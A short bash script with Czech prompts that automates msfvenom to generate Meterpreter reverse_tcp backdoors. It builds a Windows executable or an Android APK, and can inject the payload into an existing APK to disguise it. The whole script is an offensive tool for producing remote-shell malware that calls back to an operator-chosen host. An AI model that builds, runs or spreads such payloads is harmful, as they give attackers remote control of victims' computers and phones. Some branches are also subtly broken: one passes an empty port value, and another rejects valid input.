#BARVY

red="\033[1;31m"
green="\033[1;32m"
blue="\033[1;34m"
nc="\e[0m"

#AKCE

clear
echo -e "\n$green		$red 1 $nc$green: Windows	$red 2 $nc$green: Android$nc"
echo -e "$green"
read -p " Vyber OS : " choice

if [ $choice = 1 ]; then
  echo -e "$blue"
  read -p " Zadej LHOST : " lhost1
  read -p " [4444-ENTER] Zadej LPORT : " lport1
  read -p " Zadej Jmeno : " name1
  read -p " Zadej Adresar: " location1

  if [ ${#lport1} -eq 0 ]; then
    echo -e " LHOST = $lhost1 , LPORT = 4444 , NAME = $name1"
    echo -e "$nc"
    msfvenom --platform Windows -p windows/meterpreter/reverse_tcp lhost=$lhost1 lport=4444 -f exe -o $location1/$name1.exe
    else
    echo -e " LHOST = $lhost1 , LPORT = $lport1 , NAME = $name1"
    echo -e "$nc"
    msfvenom --platform Windows -p windows/meterpreter/reverse_tcp lhost=$lhost1 lport=$lport1 -f exe -o $location1/$name1.exe
 fi
elif [ $choice = 2 ]; then
 echo -e "$blue"
 read -p " Zadej LHOST : " lhost2
 read -p " [4444-ENTER] Zadej LPORT : " lport2
 read -p " Zadej Jmeno : " name2
 read -p " Zadej Adresar: " location2
 read -p " Injectovat do existujiciho apk? [y/n]: " inject

 if [ ${#lport2} -eq 0 ] && [[ $inject == "y" || $inject == "Y" ]]; then
   read -p " Zadej Adresar apk: " apk
   echo -e "$nc"
   msfvenom --platform Android -a dalvik -x $apk -p android/meterpreter/reverse_tcp lhost=$lhost2 lport=4444 -o $location2/$name2.apk
 elif [ ${#lport2} -eq 0 ] && [[ $inject == "n" || $inject == "N" ]]; then
   echo -e "$nc"
   msfvenom --platform Android -a dalvik -p android/meterpreter/reverse_tcp lhost=$lhost2 lport=$lport2 -o $location2/$name2.apk
   else
   echo -e " \033[7;31m WRONG INPUT! $nc"
   exit 1
 fi

 else
 echo -e " \033[7;31m WRONG INPUT! $nc"
 exit 1
fi
